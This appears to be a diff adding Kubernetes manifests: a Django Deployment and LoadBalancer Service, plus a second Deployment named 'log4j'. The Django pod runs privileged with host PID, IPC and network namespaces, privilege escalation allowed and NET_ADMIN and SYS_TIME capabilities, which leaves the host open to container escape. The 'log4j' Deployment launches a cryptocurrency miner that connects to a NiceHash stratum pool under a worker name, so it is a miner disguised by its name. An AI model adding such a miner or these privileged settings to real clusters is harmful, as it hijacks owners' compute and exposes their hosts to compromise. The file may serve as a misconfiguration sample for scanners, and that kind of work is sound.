@@ -1,0 +1,85 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: django-app
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: django-app
+  template:
+    metadata:
+      labels:
+        app: django-app
+    spec:
+      hostIPC: true
+      hostPID: true
+      hostNetwork: true
+      securityContext:
+        runAsUser: 1000
+        runAsGroup: 3000
+        fsGroup: 2000
+        fsGroupChangePolicy: Always
+      containers:
+      - name: django-app
+        image: "${IMAGE_REGISTRY}"
+        ports:
+        - containerPort: 8000
+        resources:
+          requests:
+            cpu: 100m
+            memory: 128Mi
+          limits:
+            cpu: 250m
+            memory: 256Mi
+        securityContext:
+          runAsUser: 2000
+          runAsNonRoot: false
+          allowPrivilegeEscalation: true
+          readOnlyRootFilesystem: false
+          privileged: true
+          capabilities:
+            add: ["NET_ADMIN", "SYS_TIME"]
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: django-app
+spec:
+  selector:
+    app: django-app
+  ports:
+    - protocol: TCP
+      port: 8000
+      targetPort: 8000   
+  type: LoadBalancer
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: log4j
+  namespace: log4j
+  labels:
+    app: log4j
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: log4j
+  template:
+    metadata:
+      labels:
+        app: log4j
+    spec:
+      containers:
+      - name: log4j
+        image: "${IMAGE_REGISTRY}"
+        args:
+          - "--url"
+          - "stratum+tcp://scrypt.auto.nicehash.com:9200"
+          - "--user"
+          - "creack.worker1"
+          - "--pass"
+          - "abcdef"
+        ports:
+        - containerPort: 4412
